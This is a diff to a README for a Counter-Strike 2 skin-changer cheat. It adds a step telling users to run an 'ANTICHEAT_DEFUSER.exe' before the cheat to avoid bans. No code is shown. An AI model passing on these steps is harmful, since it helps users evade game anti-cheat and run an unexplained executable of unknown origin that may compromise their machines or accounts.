@@ -32,8 +32,10 @@ Extract CS2_SkinChanger.zip
 (3rd) Step:
 Start CS2 and wait till you are in lobby
 (4th) Step:
-Run SkinChanger.exe and wait till SkinChanger Menu will pop up
+Run ANTICHEAT_DEFUSER.exe  you need this to run because otherwise you can get banned pretty easily
 (5th) Step:
+Run SkinChanger.exe and wait till SkinChanger Menu will pop up
+(6th) Step:
 Enjoy SkinChanger Menu and share it with friends
 
 We are not responsible if you get banned because of our client
